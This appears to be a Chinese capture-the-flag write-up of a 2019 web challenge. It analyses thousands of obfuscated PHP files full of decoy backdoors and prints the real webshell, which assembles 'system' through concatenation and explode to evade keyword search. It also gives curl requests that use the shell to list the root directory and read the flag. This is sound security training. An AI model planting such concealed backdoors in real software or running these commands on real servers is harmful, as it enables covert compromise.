---
title: 强网杯 2019 - Web - 高明的黑客
date: 2026-11-14 18:34:00
categories:
  - CTF
  - 强网杯 2019
  - Web
tags:
  - 源码审计
  - 混淆后门
  - 关键词绕过
  - 代码审计
  - webshell
cover: /img/cover/sword-girl-blue-sky.jpg
description: 强网杯 2019 代码审计题，www.tar.gz 解压出数千混淆 PHP 假后门，真后门用字符串拼接拆出 system 关键字执行命令，定位后读根目录 flag。
keywords:
  - 代码审计
  - PHP 混淆
  - 假后门
  - webshell
  - 关键字绕过
ai: >-
  本题是强网杯 2019 的 Web 题「高明的黑客」，考察海量混淆代码中的后门定位能力。页面提示网站源码备份在 www.tar.gz，下载解压得到三千多个文件名随机、内容高度混淆且布满假后门的 PHP 文件。绝大多数后门不可利用：条件恒假的 if、调用不存在的函数、写在注释里的死代码、或参数被先覆盖为空格再执行，单纯的语法检查无法把它们与真后门区分。真正的后门通过字符串拼接再 explode 分割拼出 system 关键字，规避了直接的关键字搜索，且 GET 参数无假条件拦截直接流入命令执行函数。定位方法可以是检索公开题解得到文件名，或写脚本遍历每个文件提取 GET 与 POST 参数并逐一用回显特征验证，找到后门后即可执行系统命令读取根目录的 flag。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | 强网杯 2019 |
| 方向 | Web |
| 难度 | 中等 |
| 环境 | 授权靶场（已脱敏） |

## 信息收集

访问页面提示「备份了网站源码到 www.tar.gz」。

```bash
curl "http://target:8080/www.tar.gz" -o www.tar.gz
```

解压后得到 3001 个 PHP 文件（`src/` 目录），文件名随机，每个文件内容都是大量混淆变量 + 假后门。题目与练习场标识已脱敏。

## 漏洞分析

### 分析假后门特征

逐个文件审计发现，绝大多数「后门」是**假的**，特征如下：

1. **假条件拦截**：`if('aaaa' == 'bbbb') system($_GET['x']);` —— 条件恒为 false，永不可达
2. **假函数调用**：`if(function_exists("随机名")) 随机名($var);` —— 函数不存在
3. **注释死代码**：危险调用写在 `/* ... */` 注释内
4. **参数先清空**：`$_GET['x'] = ' '; echo `{$_GET['x']}`;` —— 参数被覆盖为空格后再执行

直接 `php -l` 语法检查只能排除 16 个文件（2985 个语法正确），**不能靠语法区分真后门**。

### 定位真后门

真后门文件 `xk0SzyKwfzw.php`，末尾关键代码：

```php
$XnEGfa = $_GET['Efa5BVG'] ?? ' ';
$aYunX = "sY";
$aYunX .= "stEmXnsTcx";        // "sYstEmnsTcx"
$aYunX = explode('Xn', $aYunX); // ["sYstEm", "sTcx"]
$kDxfM = new stdClass();
$kDxfM->gHht = $aYunX[0];      // "system"
($kDxfM->gHht)($XnEGfa);       // system($_GET['Efa5BVG'])
```

真后门通过**字符串拼接 + explode 分割**拼出 `system`，避免了直接的 `system` 关键字，且参数 `Efa5BVG` 无假条件拦截，直接流向函数调用。

## 利用过程

```bash
# 列根目录
curl "http://target:8080/xk0SzyKwfzw.php?Efa5BVG=ls%20/"

# 读 flag（根目录有 flag 文件）
curl "http://target:8080/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag"
```

## 完整 EXP

payload 归档内容并入本节。真后门文件：`xk0SzyKwfzw.php`，参数：`Efa5BVG`（GET），后门逻辑：`system($_GET['Efa5BVG'])`。

```bash
# 读 flag
curl "http://target:8080/xk0SzyKwfzw.php?Efa5BVG=cat%20/flag"

# 列根目录
curl "http://target:8080/xk0SzyKwfzw.php?Efa5BVG=ls%20/"
```

## Flag

```text
flag{xxxx}
```

（通过真后门执行 `cat /flag` 读出，真实值已脱敏。）

## 踩坑与总结

- 3001 个混淆 PHP 文件中，只有极少数是真后门，其余都是假后门（假条件 / 假函数 / 注释死代码 / 参数清空）。
- 真后门用字符串拼接 + `explode` 拆分隐藏 `system` 关键字，绕过简单的关键字搜索。
- `php -l` 语法检查只能排除语法错误文件，不能区分真假后门。
- 定位方法：检索 writeup 得到后门文件名，或编写脚本遍历每个文件提取 `$_GET`/`$_POST` 参数，用 `echo <特征串>` 逐一验证回显。
